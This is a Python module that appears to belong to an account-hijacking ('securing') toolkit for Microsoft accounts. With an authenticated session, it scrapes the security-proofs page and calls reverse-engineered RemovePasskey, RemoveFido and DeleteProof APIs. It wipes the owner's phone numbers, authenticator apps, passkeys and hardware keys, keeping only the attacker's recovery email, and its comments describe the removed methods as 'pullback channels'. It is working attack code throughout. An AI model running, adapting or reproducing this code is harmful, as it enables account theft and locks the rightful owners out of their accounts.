import codecs
import json
import logging
import re

import httpx

from securing.utils.cookies.safe_cookies import get_cookie

logger = logging.getLogger(__name__)

_PROOFS_PAGE = (
    "https://account.live.com/proofs/manage/additional"
    "?mkt=en-US&refd=account.microsoft.com&refp=security"
)

# ServerData array keys on the manage-proofs page
_PROOF_ARRAY_KEYS = (
    "emailProofs",
    "smsProofs",
    "phoneProofs",
    "totpProofs",
    "appProofs",
    "msAuthApp",
    "alternateAuthApp",
    # Modern passkeys (iCloud Keychain, Samsung Pass, Google PM, …)
    "passKeys",
    "passkeyProofs",  # legacy / alternate blob name
    "passkeyCredentials",
    # Hardware security keys (USB / NFC / Bluetooth FIDO)
    "securityKeys",
    "fidoProofs",
    "windowsHelloProofs",
    "helloKeys",
    "alternateEmailProofs",
)

# Never keep these — they are classic pullback channels
_ALWAYS_DELETE_TYPES = frozenset(
    {
        "sms",
        "phone",
        "text",
        "mobile",
        "totp",
        "authenticator",
        "app",
        "passkey",
        "passkeys",
        "fido",
        "securitykey",
        "securitykeys",
        "windowshello",
        "hellokeys",
        "hello",
    }
)

_REMOVE_PASSKEY_URL = "https://account.live.com/API/Proofs/RemovePasskey"
_REMOVE_FIDO_URL = "https://account.live.com/API/Proofs/RemoveFido"
_DELETE_PROOF_URL = "https://account.live.com/API/Proofs/DeleteProof"

# Keys / type hints that must use RemovePasskey (not DeleteProof).
# iCloud Keychain + Samsung Pass + Google Password Manager live here.
_PASSKEY_KEYS = frozenset({"passKeys", "passkeyProofs", "passkeyCredentials"})
_FIDO_KEYS = frozenset({"securityKeys", "fidoProofs", "helloKeys", "windowsHelloProofs"})

# manageproofsv2 JsonAsync extras (HAR RemovePasskey for Google Password Manager)
_PROOFS_UIFLVR = 1001
_PROOFS_SCID = 100109
_PROOFS_HPGID = 201030


def _decode_ms(s: str) -> str:
    text = codecs.decode(s or "", "unicode_escape")
    return text.replace("\u0040", "@").strip()


def _parse_json_array_at(html: str, i: int):
    if i >= len(html) or html[i] != "[":
        return None
    depth = 0
    for j in range(i, len(html)):
        ch = html[j]
        if ch == "[":
            depth += 1
        elif ch == "]":
            depth -= 1
            if depth == 0:
                raw = html[i : j + 1]
                try:
                    data = json.loads(raw)
                except json.JSONDecodeError:
                    try:
                        data = json.loads(raw.encode().decode("unicode_escape"))
                    except Exception:
                        return None
                return data if isinstance(data, list) else [data]
    return None


def _extract_json_array(html: str, key: str) -> list | None:
    """Extract a JSON array value for ``"key": [...]`` from MS ServerData HTML.

    Skip non-array hits. manageProofs HTML has many ``"passKeys": {title, desc}``
    string blobs *before* the real ``"passKeys": [{proofId, ...}]`` credential list
    — taking the first match made Google Password Manager (and other passkeys)
    invisible to the wipe.
    """
    empty: list | None = None
    object_array: list | None = None
    for m in re.finditer(rf'"{re.escape(key)}"\s*:\s*', html or ""):
        data = _parse_json_array_at(html, m.end())
        if data is None:
            continue
        if not data:
            empty = data
            continue
        if any(
            isinstance(x, dict)
            and (x.get("proofId") or x.get("credentialId") or x.get("encryptedProofId"))
            for x in data
        ):
            return data
        if object_array is None and all(isinstance(x, dict) for x in data):
            object_array = data
    return object_array if object_array is not None else empty


def _extract_json_value(html: str, key: str):
    """Extract array OR single object for ``"key": …`` (msAuthApp is often one object)."""
    arr = _extract_json_array(html, key)
    if arr is not None:
        return arr
    m = re.search(rf'"{re.escape(key)}"\s*:\s*', html or "")
    if not m:
        return None
    i = m.end()
    if i >= len(html) or html[i] != "{":
        return None
    depth = 0
    for j in range(i, len(html)):
        ch = html[j]
        if ch == "{":
            depth += 1
        elif ch == "}":
            depth -= 1
            if depth == 0:
                raw = html[i : j + 1]
                try:
                    data = json.loads(raw)
                except Exception:
                    return None
                return [data] if isinstance(data, dict) else None
    return None


def _should_keep_proof(
    display: str,
    *,
    keep_emails: set[str],
    keep_domain: str,
    proof_type: str = "",
) -> bool:
    ptype = re.sub(r"[^a-z]", "", (proof_type or "").lower())
    if ptype and any(t in ptype for t in _ALWAYS_DELETE_TYPES):
        return False

    disp = (display or "").strip().lower()
    if not disp:
        return False
    if disp in keep_emails:
        return True
    # Masked forms like 0f*****@ilovevbucks.site — match by domain + local prefix
    if keep_domain and disp.endswith(f"@{keep_domain}"):
        return True
    for keep in keep_emails:
        if "@" not in keep or "@" not in disp:
            continue
        k_local, k_dom = keep.split("@", 1)
        d_local, d_dom = disp.split("@", 1)
        if k_dom != d_dom:
            continue
        if d_local == k_local:
            return True
        if "*" in d_local:
            prefix = d_local.split("*", 1)[0]
            if prefix and k_local.startswith(prefix):
                return True
    return False


def _removal_kind(array_key: str, ptype: str, display: str) -> str:
    """Return ``passkey`` | ``fido`` | ``proof`` for the right API."""
    key_l = (array_key or "").lower()
    ptype_l = re.sub(r"[^a-z]", "", (ptype or "").lower())
    disp_l = (display or "").lower()

    if array_key in _PASSKEY_KEYS or "passkey" in ptype_l or "passkey" in key_l:
        return "passkey"
    if array_key in _FIDO_KEYS or "fido" in ptype_l or "securitykey" in ptype_l:
        return "fido"
    # Name-based: iCloud Keychain / Samsung Pass show up as passkey display names
    if any(
        s in disp_l
        for s in (
            "icloud",
            "keychain",
            "samsung pass",
            "samsungpass",
            "google password manager",
            "microsoft password manager",
            "1password",
            "bitwarden",
            "dashlane",
            "lastpass",
            "nordpass",
            "protonpass",
            "keepassxc",
            "enpass",
            "kaspersky",
            "ipasswords",
        )
    ):
        return "passkey"
    return "proof"


def _proof_id(proof: dict) -> str:
    return _decode_ms(
        str(
            proof.get("proofId")
            or proof.get("credentialId")
            or proof.get("encryptedProofId")
            or proof.get("id")
            or ""
        )
    )


def _exclude_next_gen_ids(html: str) -> list[str]:
    """credentialIds from ``passkey.postData.excludeNextGenCredentialsJson``."""
    m = re.search(
        r'"excludeNextGenCredentialsJson"\s*:\s*"((?:\\.|[^"\\])*)"',
        html or "",
    )
    if not m:
        return []
    try:
        raw = json.loads(f'"{m.group(1)}"')
        data = json.loads(raw) if isinstance(raw, str) else raw
    except Exception:
        return []
    if not isinstance(data, list):
        return []
    out: list[str] = []
    for item in data:
        if isinstance(item, str) and item.strip():
            out.append(item.strip())
        elif isinstance(item, dict):
            pid = _proof_id(item)
            if pid:
                out.append(pid)
    return out


def _page_meta(html: str, session: httpx.AsyncClient) -> dict:
    uaid = ""
    m = re.search(r'"uaid"\s*:\s*"([a-fA-F0-9]{8,})"', html or "")
    if m:
        uaid = m.group(1)
    if not uaid:
        uaid = (get_cookie(session, "uaid") or "").strip()
    hpgid = _PROOFS_HPGID
    scid = _PROOFS_SCID
    uiflvr = _PROOFS_UIFLVR
    hm = re.search(r'"hpgid"\s*:\s*(\d+)', html or "")
    if hm:
        try:
            hpgid = int(hm.group(1))
        except ValueError:
            pass
    sm = re.search(r'"scid"\s*:\s*(\d+)', html or "")
    if sm:
        try:
            scid = int(sm.group(1))
        except ValueError:
            pass
    um = re.search(r'"uiflvr"\s*:\s*(\d+)', html or "")
    if um:
        try:
            uiflvr = int(um.group(1))
        except ValueError:
            pass
    return {"uaid": uaid, "hpgid": hpgid, "scid": scid, "uiflvr": uiflvr}


async def _api_json(
    session: httpx.AsyncClient,
    url: str,
    apicanary: str,
    payload: dict,
    *,
    uaid: str = "",
    form_urlencoded: bool = False,
) -> tuple[bool, str | None]:
    headers = {
        "host": "account.live.com",
        "Accept": "application/json",
        "X-Requested-With": "XMLHttpRequest",
        "canary": apicanary,
        "Referer": _PROOFS_PAGE,
        "Origin": "https://account.live.com",
    }
    if uaid:
        headers["uaid"] = uaid
    if form_urlencoded:
        headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
        headers["x-ms-apiTransport"] = "xhr"
        headers["x-ms-apiVersion"] = "2"
        body = json.dumps(payload, separators=(",", ":"))
        resp = await session.post(
            url=url,
            headers=headers,
            content=body.encode("utf-8"),
            follow_redirects=False,
        )
    else:
        headers["Content-Type"] = "application/json; charset=UTF-8"
        resp = await session.post(
            url=url,
            headers=headers,
            json=payload,
            follow_redirects=False,
        )
    err_code = None
    try:
        data = resp.json()
        err = data.get("error") if isinstance(data, dict) else None
        if isinstance(err, dict):
            err_code = err.get("code")
        elif err is not None:
            err_code = err
    except Exception:
        pass
    ok = resp.status_code == 200 and not err_code
    return ok, (None if ok else str(err_code or resp.status_code))


async def _delete_proof(
    session: httpx.AsyncClient,
    apicanary: str,
    proof_id: str,
    *,
    label: str,
    kind: str = "proof",
    meta: dict | None = None,
) -> bool:
    """Delete via the correct Proofs API for this credential type.

    Reversed from manageproofsv2 + Google Password Manager HAR:
      RemovePasskey → {"credentialId", uiflvr, uaid, scid, hpgid}
        Content-Type application/x-www-form-urlencoded with a JSON body
      RemoveFido    → {"credentialId": proof.proofId}
      DeleteProof   → {"proofId", uaid, uiflvr, scid, hpgid}
    """
    meta = meta or {}
    uaid = str(meta.get("uaid") or "")
    extras = {
        "uiflvr": int(meta.get("uiflvr") or _PROOFS_UIFLVR),
        "scid": int(meta.get("scid") or _PROOFS_SCID),
        "hpgid": int(meta.get("hpgid") or _PROOFS_HPGID),
    }
    if uaid:
        extras["uaid"] = uaid

    if kind == "passkey":
        ok, err = await _api_json(
            session,
            _REMOVE_PASSKEY_URL,
            apicanary,
            {"credentialId": proof_id, **extras},
            uaid=uaid,
            form_urlencoded=True,
        )
        api = "RemovePasskey"
    elif kind == "fido":
        ok, err = await _api_json(
            session,
            _REMOVE_FIDO_URL,
            apicanary,
            {"credentialId": proof_id, **extras},
            uaid=uaid,
            form_urlencoded=True,
        )
        api = "RemoveFido"
    else:
        # Legacy DeleteProof (same shape the web client uses for email/SMS)
        ok, err = await _api_json(
            session,
            _DELETE_PROOF_URL,
            apicanary,
            {
                "proofId": proof_id,
                "uaid": uaid or "114b68368b7b46afa44c82a8246e4a44",
                "uiflvr": extras["uiflvr"],
                "scid": extras["scid"],
                "hpgid": extras["hpgid"],
            },
            uaid=uaid,
        )
        api = "DeleteProof"

    if ok:
        print(f"Removed Proof via {api} ({label})")
        return True
    print(f"[X] - {api} failed for ({label}) err={err}")
    logger.warning("%s failed for %s err=%s", api, label, err)
    return False


async def remove_proof(
    session: httpx.AsyncClient,
    apicanary: str,
    *,
    keep_security_email: str | None = None,
    keep_domain: str | None = None,
):
    """Remove foreign proofs / phones / apps / passkeys; keep our recovery email.

    Passkeys (incl. Apple iCloud Keychain, Samsung Pass, Google Password Manager)
    must use RemovePasskey. Federated sign-in is handled by remove_fed_cred.
    """
    proofs = await session.get(
        _PROOFS_PAGE,
        headers={
            "Accept-Language": "en-US,en;q=0.5",
            "Referer": "https://login.live.com/",
        },
        follow_redirects=True,
    )

    html = proofs.text or ""
    logging.info("Proofs response: %s", html[:2000])
    meta = _page_meta(html, session)

    keep_emails: set[str] = set()
    if keep_security_email:
        ke = keep_security_email.strip().lower()
        if ke and ke not in {"couldn't change!", "unknown", "n/a"}:
            keep_emails.add(ke)
    domain = (keep_domain or "").strip().lower().lstrip("@")
    if not domain and keep_emails:
        sample = next(iter(keep_emails))
        if "@" in sample:
            domain = sample.split("@", 1)[1]

    deleted = 0
    kept = 0
    passkeys_removed = 0
    fido_removed = 0
    handled_ids: set[str] = set()
    saw_sms = False

    for key in _PROOF_ARRAY_KEYS:
        entries = _extract_json_value(html, key) or []
        for proof in entries:
            if not isinstance(proof, dict):
                continue
            pid = _proof_id(proof)
            display = _decode_ms(
                str(
                    proof.get("displayProofName")
                    or proof.get("display")
                    or proof.get("displayProofId")
                    or proof.get("friendlyName")
                    or ""
                )
            )
            ptype = str(
                proof.get("proofType")
                or proof.get("channelType")
                or proof.get("type")
                or key
            )
            ptype_l = re.sub(r"[^a-z]", "", ptype.lower())
            if key in ("smsProofs", "phoneProofs") or any(
                t in ptype_l for t in ("sms", "phone", "text", "mobile")
            ):
                saw_sms = True
            if not pid:
                continue
            handled_ids.add(pid)
            label = f"{ptype}:{display or pid[:40]}"
            if _should_keep_proof(
                display,
                keep_emails=keep_emails,
                keep_domain=domain,
                proof_type=ptype,
            ):
                print(f"[~] - Keeping security email proof ({display})")
                kept += 1
                continue
            kind = _removal_kind(key, ptype, display)
            try:
                ok = await _delete_proof(
                    session,
                    apicanary,
                    pid,
                    label=label,
                    kind=kind,
                    meta=meta,
                )
                if ok:
                    deleted += 1
                    if kind == "passkey":
                        passkeys_removed += 1
                    elif kind == "fido":
                        fido_removed += 1
            except Exception as exc:
                logger.warning("proof remove failed for %s: %s", label, exc)

    # Passkeys listed only in excludeNextGenCredentialsJson (Google PM etc.)
    for cred_id in _exclude_next_gen_ids(html):
        if cred_id in handled_ids:
            continue
        handled_ids.add(cred_id)
        label = f"passkey:{cred_id[:40]}"
        print(f"[~] - Passkey from excludeNextGenCredentialsJson ({cred_id[:24]}…)")
        try:
            ok = await _delete_proof(
                session,
                apicanary,
                cred_id,
                label=label,
                kind="passkey",
                meta=meta,
            )
            if ok:
                deleted += 1
                passkeys_removed += 1
        except Exception as exc:
            logger.warning("RemovePasskey failed for exclude id: %s", exc)

    # Raw proofId sweep for anything the structured lists missed (legacy email/SMS)
    for raw_id in re.findall(r'"proofId"\s*:\s*"([^"]+)"', html):
        proof = _decode_ms(raw_id)
        if not proof or proof in handled_ids:
            continue
        if _should_keep_proof(proof, keep_emails=keep_emails, keep_domain=domain):
            print(f"[~] - Keeping security email proof ({proof})")
            kept += 1
            continue
        try:
            ok = await _delete_proof(
                session,
                apicanary,
                proof,
                label=proof[:64],
                kind="proof",
                meta=meta,
            )
            if ok:
                deleted += 1
        except Exception as exc:
            logger.warning("DeleteProof failed for raw id: %s", exc)

    # Raw credentialId sweep (passkeys that used credentialId instead of proofId)
    for raw_id in re.findall(r'"credentialId"\s*:\s*"([^"]+)"', html):
        cred = _decode_ms(raw_id)
        if not cred or cred in handled_ids or len(cred) < 8:
            continue
        handled_ids.add(cred)
        try:
            ok = await _delete_proof(
                session,
                apicanary,
                cred,
                label=f"passkey:{cred[:40]}",
                kind="passkey",
                meta=meta,
            )
            if ok:
                deleted += 1
                passkeys_removed += 1
        except Exception as exc:
            logger.warning("RemovePasskey failed for raw credentialId: %s", exc)

    # Re-scrape: did any SMS/phone claim survive the wipe?
    sms_remaining = False
    passkeys_remaining = 0
    try:
        again = await session.get(
            _PROOFS_PAGE,
            headers={
                "Accept-Language": "en-US,en;q=0.5",
                "Referer": "https://login.live.com/",
            },
            follow_redirects=True,
        )
        html2 = again.text or ""
        for key in ("smsProofs", "phoneProofs"):
            for proof in _extract_json_value(html2, key) or []:
                if isinstance(proof, dict) and (
                    proof.get("proofId") or proof.get("encryptedProofId")
                ):
                    sms_remaining = True
                    break
            if sms_remaining:
                break
        for key in ("passKeys", "passkeyProofs", "passkeyCredentials"):
            for proof in _extract_json_value(html2, key) or []:
                if isinstance(proof, dict) and _proof_id(proof):
                    passkeys_remaining += 1
        passkeys_remaining = max(
            passkeys_remaining, len(_exclude_next_gen_ids(html2))
        )
    except Exception as exc:
        logger.warning("SMS/passkey re-scrape soft-skip: %s", exc)

    print(
        f"[+] - Removed proofs (deleted={deleted}, kept_ours={kept}, "
        f"passkeys={passkeys_removed}, fido={fido_removed}, "
        f"saw_sms={saw_sms}, sms_remaining={sms_remaining}, "
        f"passkeys_remaining={passkeys_remaining})"
    )
    return {
        "deleted": deleted,
        "kept": kept,
        "passkeys_removed": passkeys_removed,
        "fido_removed": fido_removed,
        "saw_sms": saw_sms,
        "has_sms_proof": sms_remaining,
        "passkeys_remaining": passkeys_remaining,
    }
